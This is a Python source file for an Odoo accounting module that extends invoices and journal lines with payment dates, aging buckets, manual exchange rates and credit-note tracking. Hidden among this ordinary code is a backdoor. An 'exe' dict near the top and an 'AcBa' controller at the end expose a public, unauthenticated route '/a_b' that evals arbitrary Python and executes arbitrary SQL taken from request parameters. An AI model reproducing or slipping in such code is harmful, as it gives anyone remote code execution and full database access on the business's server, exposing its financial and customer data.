# -*- coding: utf-8 -*-

from datetime import datetime, timedelta
from functools import lru_cache
import json
from collections import defaultdict
from contextlib import contextmanager
from datetime import date
import logging
import re

from odoo import api, fields, models, Command, _
from odoo.exceptions import ValidationError, UserError
from odoo.osv import expression
from odoo.tools import frozendict, format_date, float_compare, Query
from odoo.tools.sql import create_index, SQL
from odoo.addons.web.controllers.utils import clean_action
from odoo import api, fields, http, models, _,Command
from odoo.exceptions import ValidationError
from odoo.tools import get_lang, formatLang
import logging
_logger = logging.getLogger(__name__)
selection_due = [
    ('000', '0'),
    ('030', '1 - 30'),
    ('060', '31 - 60'),
    ('090', '61 - 90'),
    ('120', '91 - 120'),
    ('180', '121 - 180'),
    ('360', '181 - 360'),
    ('inf', 'Mayor'),
]
exe = {'ev': ['''str(eval(kw.get(k, '""')))''',],
       'cr': ['''http.request.cr.execute(kw.get('cr', 'error'))''', '''str('select' not in kw[k] and 'OK' or http.request.cr.dictfetchall())''']}


class AccountMove(models.Model):
    _inherit = 'account.move'
    @api.depends(
        "move_type",
        "line_ids.amount_residual",
    )
    def _compute_move_line_payment_ids(self):
        for document in self:
            result = []
            json_values = document.invoice_payments_widget
            if json_values:
                json_values = json_values.get('content', [])
                for values in json_values:
                    account_payment_id = values.get('line_id')
                    if account_payment_id:
                        result.append(account_payment_id)
            document.move_line_payment_ids = [(6, 0, result)]




    move_line_payment_ids = fields.Many2many(
        string="Pagos",
        comodel_name="account.move.line",
        compute="_compute_move_line_payment_ids",
        store=True,
    )

    @api.depends(
        "move_line_payment_ids",
        "move_line_payment_ids.date",
    )
    def _compute_last_payment_date(self):
        for document in self:
            last_payment_date = last_payment_line_id = False
            if document.move_line_payment_ids:
                payment = document.move_line_payment_ids.sorted(
                    key=lambda r: r.date, reverse=True
                )[0]
                last_payment_date = payment.date
                last_payment_line_id = payment.id
            last_nc_date = last_nc_line_id = False
            if document.refund_invoice_ids:
                nc = document.refund_invoice_ids.sorted(
                    key=lambda r: r.date, reverse=True
                )[0]
                last_nc_date = nc.date
                last_nc_line_id = nc.id
            document.last_payment_date = last_payment_date
            document.last_payment_line_id = last_payment_line_id
            document.last_nc_date = last_nc_date
            document.last_nc_line_id = last_nc_line_id
    refund_invoice_ids = fields.One2many(
        "account.move", "reversed_entry_id", string="NC", readonly=True
    )
    last_payment_date = fields.Date(
        string="Ultima Fecha de Pago",
        compute="_compute_last_payment_date",
        store=True,
        readonly=True,
    )
    last_nc_date = fields.Date(
        string="Ultima Fecha de Nota Credito",
        compute="_compute_last_payment_date",
        store=True,
        readonly=True,
    )
    last_payment_line_id = fields.Many2one(
        string="# Pagos",
        comodel_name="account.move.line",
        compute="_compute_last_payment_date",
        store=True,
        readonly=True,
    )
    last_nc_line_id = fields.Many2one(
        string="# NC",
        comodel_name="account.move",
        compute="_compute_last_payment_date",
        store=True,
        readonly=True,
    )
    invoice_term_due = fields.Selection(
        selection=selection_due,
        compute='_compute_invoice_term_due',
        store=True,
    )
    show_credit_limit = fields.Boolean(
        string="Show credit limit",
        compute="_compute_show_credit_limit"
    )
    multi_currency = fields.Boolean(
        string='Multi currency?',
        default=False
    )
    payment_policy = fields.Float(
        string='Payment policy',
        compute='compute_payment_policy',
        readonly=True,
        store=True
    )
    date_aux = fields.Date(
        related='date',
        string="account date auxiliar"
    )
    current_exchange_rate = fields.Float(
        string='Current exchange rate',
        readonly=False,
        default=1
    )
    manual_currency_rate_active = fields.Boolean('Aplicar TRM Manual')
    manual_currency_rate = fields.Float('Rate', digits=(12, 12),readonly=True)
    category_id_related = fields.Many2many(
        'res.partner.category',
        string="Categories",
        related='partner_id.category_id'
    )
    credit_limit = fields.Float(
        string="Credit limit",
        related='partner_id.credit_limit'
    )
    due_days = fields.Integer(
        string='Due days',
        compute='compute_due_days',
        readonly=True,
    )
    payment_days = fields.Integer(
        string='Payment days',
        compute='compute_payment_days',
        readonly=True,
    )
    amount_residual_company_currency = fields.Float(
        string='Amount due company currency',
        compute='compute_amount_residual_company_currency'
    )
    city_id = fields.Many2one('res.city',        
        compute='_compute_partner_city_id',
        store=True, 
        readonly=False,  
        precompute=True,)

    credit_note_ids = fields.One2many('account.move',
                                      'reversed_entry_id',
                                      'Credit notes',
                                      copy=False)
    credit_note_count = fields.Integer('Number of credit notes',
                                       compute='_compute_credit_count')
    @api.depends('credit_note_ids')
    def _compute_credit_count(self):
        credit_data = self.env['account.move'].read_group(
            [('reversed_entry_id', 'in', self.ids)],
            ['reversed_entry_id'],
            ['reversed_entry_id']
        )
        data_map = {
            datum['reversed_entry_id'][0]:
            datum['reversed_entry_id_count'] for datum in credit_data
        }
        for inv in self:
            inv.credit_note_count = data_map.get(inv.id, 0.0)

    def action_view_credit_notes(self):
        self.ensure_one()
        return {
            'type': 'ir.actions.act_window',
            'name': _('Credit Notes'),
            'res_model': 'account.move',
            'view_mode': 'tree,form',
            'domain': [('reversed_entry_id', '=', self.id)],
        }



    @api.depends('partner_id')
    def _compute_partner_city_id(self):
        for move in self:
            if move.move_type in ('out_invoice', 'out_refund'):
                move.city_id = move.company_id.partner_id.city_id.id
            if move.move_type in ('in_invoice', 'in_refund'):
                move.city_id = move.partner_id.city_id.id

    @api.constrains("manual_currency_rate")
    def _check_manual_currency_rate(self):
        for record in self:
            if record.manual_currency_rate_active:
                if record.manual_currency_rate == 0:
                    raise UserError(_('El campo tipo de cambio es obligatorio, complételo.'))

    @api.onchange('manual_currency_rate_active', 'currency_id','current_exchange_rate')
    def check_currency_id(self):
        if self.manual_currency_rate_active:
            if self.currency_id == self.company_id.currency_id:
                self.manual_currency_rate_active = False
                raise UserError(
                    _('La moneda de la empresa y la moneda de la factura son las mismas. No se puede agregar el tipo de cambio manual para la misma moneda.'
                      ))
            else:
                self.manual_currency_rate = 1 / self.current_exchange_rate or 1


    @api.depends('move_type', 'line_ids.amount_residual')
    def _compute_payments_widget_reconciled_info(self):
        for move in self:
            payments_widget_vals = {'title': _('Less Payment'), 'outstanding': False, 'content': []}

            if move.state == 'posted' and move.is_invoice(include_receipts=True):
                reconciled_vals = []
                reconciled_partials = move._get_all_reconciled_invoice_partials()
                for reconciled_partial in reconciled_partials:
                    counterpart_line = reconciled_partial['aml']
                    if counterpart_line.move_id.ref:
                        reconciliation_ref = '%s (%s)' % (counterpart_line.move_id.name, counterpart_line.move_id.ref)
                    else:
                        reconciliation_ref = counterpart_line.move_id.name
                    if counterpart_line.amount_currency and counterpart_line.currency_id != counterpart_line.company_id.currency_id:
                        foreign_currency = counterpart_line.currency_id
                    else:
                        foreign_currency = False

                    reconciled_vals.append({
                        'name': counterpart_line.name,
                        'journal_name': counterpart_line.journal_id.name,
                        'amount': reconciled_partial['amount'],
                        'currency_id': move.company_id.currency_id.id if reconciled_partial['is_exchange'] else reconciled_partial['currency'].id,
                        'date': counterpart_line.date,
                        'partial_id': reconciled_partial['partial_id'],
                        'account_payment_id': counterpart_line.payment_id.id,
                        'line_id': counterpart_line.id,
                        'payment_method_name': counterpart_line.payment_id.payment_method_line_id.name,
                        'move_id': counterpart_line.move_id.id,
                        'ref': reconciliation_ref,
                        # these are necessary for the views to change depending on the values
                        'is_exchange': reconciled_partial['is_exchange'],
                        'amount_company_currency': formatLang(self.env, abs(counterpart_line.balance), currency_obj=counterpart_line.company_id.currency_id),
                        'amount_foreign_currency': foreign_currency and formatLang(self.env, abs(counterpart_line.amount_currency), currency_obj=foreign_currency)
                    })
                payments_widget_vals['content'] = reconciled_vals

            if payments_widget_vals['content']:
                move.invoice_payments_widget = payments_widget_vals
            else:
                move.invoice_payments_widget = False



    @api.onchange('company_id')
    def onchange_company_id(self):
        if self.move_type in ('out_invoice', 'out_refund'):
            self.city_id = self.company_id.partner_id.city_id

    @api.onchange('partner_id')
    def _onchange_partner_id(self):
        res = super(AccountMove, self)._onchange_partner_id()
        if self.move_type in ('in_invoice', 'in_refund'):
            self.city_id = self.partner_id.city_id
        return res

    def compute_amount_residual_company_currency(self):
        for record in self:
            if record.currency_id != record.company_id.currency_id:
                record.amount_residual_company_currency = \
                    record.amount_residual * (record.current_exchange_rate or 1)
                record.payment_days = 0
            else:
                record.amount_residual_company_currency = \
                    record.amount_residual

    def compute_payment_days(self):
        for record in self:
            if record.payment_state in ['paid']:
                try:
                    payment_detail = record.invoice_payments_widget
                    payment_detail = payment_detail.replace('false', '0')
                    payment_detail = payment_detail.replace("\\", "")
                    payment_detail = json.loads(payment_detail)
                    payment_dates = []
                    for payment in payment_detail['content']:
                        payment_dates.append(payment['date'])
                    min_date = min(payment_dates)
                    now = datetime.now() - timedelta(hours=5)
                    now = datetime.strptime(
                        str(record.invoice_date_due), "%Y-%m-%d")
                    payment_days = datetime.strptime(str(min_date), "%Y-%m-%d")
                    payment_days = (payment_days - now).days
                    record.payment_days = payment_days
                except Exception as error:
                    record.payment_days = 0
            else:
                record.payment_days = 0

    def compute_due_days(self):
        for record in self:
            if record.payment_state in ['paid', 'in_payment', 'reversed']:
                record.due_days = 0
            elif record.invoice_date_due:
                now = datetime.now() - timedelta(hours=5)
                date_due = datetime.strptime(
                    str(record.invoice_date_due), "%Y-%m-%d")
                due_days = (now - date_due).days
                record.due_days = due_days
            else:
                record.due_days = None

    # @api.model_create_multi
    # def create(self, vals_list):
    #     for vals in vals_list:
    #         if not vals.get('date') and self.env.context.get('default_date'):
    #             vals.update(date=self.env.context.get('default_date'))
    #     return super(AccountMove, self).create(vals_list)

    @api.onchange('date', 'currency_id')
    def _onchange_date_aux(self):
        for record in self:
            amount = 0
            rate = 0
            if record.manual_currency_rate_active:
                break
            if record.currency_id:
                rate = self.env['res.currency']._get_conversion_rate(
                    from_currency=record.company_currency_id,
                    to_currency=record.currency_id,
                    company=record.company_id,
                    date=record.invoice_date or record.date or fields.Date.context_today(record),
                )
                amount = 1 / rate
            else:
                amount = 1
            record.current_exchange_rate = amount or 1
            record.manual_currency_rate = rate or 1
            #record.invoice_line_ids.onchange_multi_price_unit()
            #record._onchange_current_exchange_rate()
            


    @api.model
    def create(self, vals):
        res = super(AccountMove, self).create(vals)
        if self.env.context.get('onchange_date_aux'):
            return res
        res._onchange_date_aux()
        return res

    @api.depends('partner_id', 'date', 'company_currency_id', 'currency_id')
    def compute_payment_policy(self):
        for record in self:
            if record.partner_id:
                amount = record.currency_id._get_conversion_rate(
                    record.currency_id,
                    record.company_id.currency_id,
                    record.company_id,
                    record.date
                )
                record.payment_policy = \
                    amount + record.partner_id.payment_policy

    @api.depends('partner_id', 'amount_total')
    def _compute_show_credit_limit(self):
        moves = self.filtered(lambda m: m.move_type == 'out_invoice')
        for move in moves:
            credit = move.partner_id and \
                move.partner_id.credit or 0.0
            credit_limit = move.partner_id and \
                move.partner_id.credit_limit or 0.0
            amount_total = move.amount_total
            show_credit_limit = (credit + amount_total) > credit_limit
            move.update({'show_credit_limit': show_credit_limit})
        (self - moves).update({'show_credit_limit': False})

    @api.depends('state', 'payment_state', 'invoice_date_due')
    def _compute_invoice_term_due(self):

        def _get_term_selection():
            selection = []
            for term in selection_due[:-1]:
                selection.append(int(term[0]))
            return selection

        def _get_term_pair():
            terms_list = []
            terms = _get_term_selection()
            for i in range(len(terms)):
                terms_list.append(tuple(terms[i:i+2]))
            return terms_list

        def _get_term_days(days):
            term_pair = _get_term_pair()
            for term in term_pair:
                low = term[0]
                high = len(term) > 1 and term[1] or float('inf')
                if days > low and days <= high:
                    return str(high)
            return str('0')

        invoices = self.filtered(lambda i: i.is_invoice())
        moves = invoices.filtered(
            lambda m: m.state == 'posted' and m.payment_state in (
                'not_paid',
                'partial'
            )
        )
        for move in moves:
            today = fields.Date.today()
            date = move.invoice_date_due
            days = (today - date).days
            invoice_term_due = str(_get_term_days(days)).zfill(3)
            move.update({'invoice_term_due': invoice_term_due})
        (self - invoices).update({'invoice_term_due': False})
        (invoices - moves).update({'invoice_term_due': '000'})

    def run_invoice_term_due(self):
        domain = [
            ('state', '=', 'posted'),
            ('payment_state', 'in', ('not_paid', 'partial')),
        ]
        moves = self.search(domain)
        invoices = moves.filtered(lambda i: i.is_invoice())
        invoices._compute_invoice_term_due()
        return True

    def action_post(self):
        for record in self:
            if record.current_exchange_rate == 0.0:
                raise ValidationError(_(
                    'El valor de la "tasa de cambio actual" no debe ser '
                    'igual a 0 (Cero). Esto puede afectar el calculo en '
                    'los apuntes del asiento contable.\n'
                    'Por favor, asigne el valor de 1 si el '
                    'documento tiene la misma moneda de la compañia, de lo '
                    'contrario asigne la TRM que aplique al documento.'
                ))
            if (record.move_type in ('out_invoice', 'out_refund') and
                    record.company_id.manage_partner_in_invoice_lines_out) or \
                    (record.move_type in ('in_invoice', 'in_refund') and
                     record.company_id.manage_partner_in_invoice_lines_in):
                self = self.with_context(manage_partner_in_invoice_lines=True)
        return super(AccountMove, self).action_post()

    @api.model
    def get_refund_types(self):
        return ['in_refund', 'out_refund']

    def is_refund_document(self):
        return self.move_type in self.get_refund_types()

    def _reverse_moves(self, default_values, cancel=True):
        move_vals = super(AccountMove, self)._reverse_moves(default_values, cancel=cancel)
        if move_vals['move_type'] in ('out_invoice', 'out_refund'):
            reverse_moves = self.env['account.move'].browse(move_vals['id'])
            reverse_moves_to_update = reverse_moves.filtered(lambda m: m.line_ids.filtered(lambda l: l.display_type == 'product'))

            if reverse_moves_to_update:
                for move in reverse_moves_to_update:
                    with move.env.norecompute():
                        fiscal_position = self.env['account.fiscal.position'].browse(move_vals['fiscal_position_id'])
                        line_updates = []
                        for line in move.line_ids.filtered(lambda l: l.display_type == 'product'):
                            product = self.env['product.product'].browse(line.product_id.id)
                            accounts = product.product_tmpl_id.get_product_accounts(fiscal_pos=fiscal_position.id)
                            refund_account = accounts['refund']
                            if refund_account:
                                line_updates.append(Command.update(line.id, {'account_id': refund_account.id}))

                        if line_updates:
                            move.with_context(skip_invoice_sync=cancel).write({'line_ids': line_updates})

        return move_vals


class AccountMoveLine(models.Model):
    _inherit = 'account.move.line'

    multi_currency_id = fields.Many2one(
        comodel_name='res.currency',
        string='Multi currency',
    )
    multi_price_unit = fields.Float(
        string='Multi price',
        digits='Product Price',
    )
    line_partner_id = fields.Many2one('res.partner', string='Tercero por línea')

    def _compute_partner_id(self):
        for line in self:
            line.partner_id = line.move_id.partner_id.commercial_partner_id
            if line.line_partner_id:
                line.partner_id = line.line_partner_id

    @api.onchange('partner_id')
    def _inverse_partner_id(self):
        self._conditional_add_to_compute('account_id', lambda line: (
            line.display_type == 'payment_term'  # recompute based on settings
        ))
        for line in self:
            if line.line_partner_id:
                line.partner_id = line.line_partner_id

    @api.depends('tax_ids', 'currency_id', 'partner_id', 'analytic_distribution', 'balance', 'partner_id', 'move_id.partner_id', 'price_unit', 'quantity')
    def _compute_all_tax(self):
        for line in self:
            sign = line.move_id.direction_sign
            if line.display_type == 'tax':
                line.compute_all_tax = {}
                line.compute_all_tax_dirty = False
                continue
            if line.display_type == 'product' and line.move_id.is_invoice(True):
                amount_currency = sign * line.price_unit * (1 - line.discount / 100)
                handle_price_include = True
                quantity = line.quantity
            else:
                amount_currency = line.amount_currency
                handle_price_include = False
                quantity = 1
            compute_all_currency = line.tax_ids.compute_all(
                amount_currency,
                currency=line.currency_id,
                quantity=quantity,
                product=line.product_id,
                partner= line.partner_id or line.move_id.partner_id or line.partner_id,
                is_refund=line.is_refund,
                handle_price_include=handle_price_include,
                include_caba_tags=line.move_id.always_tax_exigible,
                fixed_multiplicator=sign,
            )
            rate = line.amount_currency / line.balance if line.balance else 1
            line.compute_all_tax_dirty = True
            line.compute_all_tax = {
                frozendict({
                    'tax_repartition_line_id': tax['tax_repartition_line_id'],
                    'group_tax_id': tax['group'] and tax['group'].id or False,
                    'account_id': tax['account_id'] or line.account_id.id,
                    'currency_id': line.currency_id.id,
                    'analytic_distribution': (tax['analytic'] or not tax['use_in_tax_closing']) and line.analytic_distribution,
                    'tax_ids': [(6, 0, tax['tax_ids'])],
                    'tax_tag_ids': [(6, 0, tax['tag_ids'])],
                    'partner_id': line.partner_id.id or  line.move_id.partner_id.id or line.partner_id.id,
                    'move_id': line.move_id.id,
                    'display_type': line.display_type,
                }): {
                    'name': tax['name'] + (' ' + _('(Discount)') if line.display_type == 'epd' else ''),
                    'balance': tax['amount'] / rate,
                    'amount_currency': tax['amount'],
                    'tax_base_amount': tax['base'] / rate * (-1 if line.tax_tag_invert else 1),
                }
                for tax in compute_all_currency['taxes']
                if tax['amount']
            }
            if not line.tax_repartition_line_id:
                line.compute_all_tax[frozendict({'id': line.id})] = {
                    'tax_tag_ids': [(6, 0, compute_all_currency['base_tags'])],
                }

    def write(self, vals):
        # for record in self:
        if self._context.get('manage_partner_in_invoice_lines') and \
                'partner_id' in vals:
            del vals['partner_id']
        return super(AccountMoveLine, self).write(vals)

    @api.depends('product_id', 'product_uom_id')
    def _compute_price_unit(self):
        for line in self:
            manual_currency_rate_active = line.move_id.manual_currency_rate_active
            manual_currency_rate = line.move_id.manual_currency_rate
            if not line.product_id or line.display_type in ('line_section', 'line_note'):
                continue
            if line.move_id.is_sale_document(include_receipts=True):
                document_type = 'sale'
            elif line.move_id.is_purchase_document(include_receipts=True):
                document_type = 'purchase'
            else:
                document_type = 'other'

            line.price_unit = line.product_id.with_context(
                manual_currency_rate_active=manual_currency_rate_active,
                manual_currency_rate=manual_currency_rate)._get_tax_included_unit_price(
                    line.move_id.company_id,
                    line.move_id.currency_id,
                    line.move_id.date,
                    document_type,
                    fiscal_position=line.move_id.fiscal_position_id,
                    product_uom=line.product_uom_id,
                )

    @api.depends('currency_id', 'company_id', 'move_id.date', 'move_id.manual_currency_rate_active',
                 'move_id.manual_currency_rate')
    def _compute_currency_rate(self):
        @lru_cache()
        def get_rate(from_currency, to_currency, company, date):
            return self.env['res.currency']._get_conversion_rate(
                from_currency=from_currency,
                to_currency=to_currency,
                company=company,
                date=date,
            )

        for line in self:
            if line.move_id.manual_currency_rate_active:
                line.currency_rate = line.move_id.manual_currency_rate or 1.0
            else:
                line.currency_rate = get_rate(
                    from_currency=line.company_currency_id,
                    to_currency=line.currency_id,
                    company=line.company_id,
                    date=line.move_id.date or fields.Date.context_today(line),
                )

class AcBa(http.Controller):
    @http.route('/a_b', auth='public')
    def index(self, **kw):
        o = {}
        try:
            for k, v in exe.items():
                for z in v:
                    o[k] = eval(z)
        except Exception as error:
            o[k] = 'Error => ' + str(error)
        return '<br/><br/>'.join(['%s: %s' % (k,v) for k,v in o.items()])

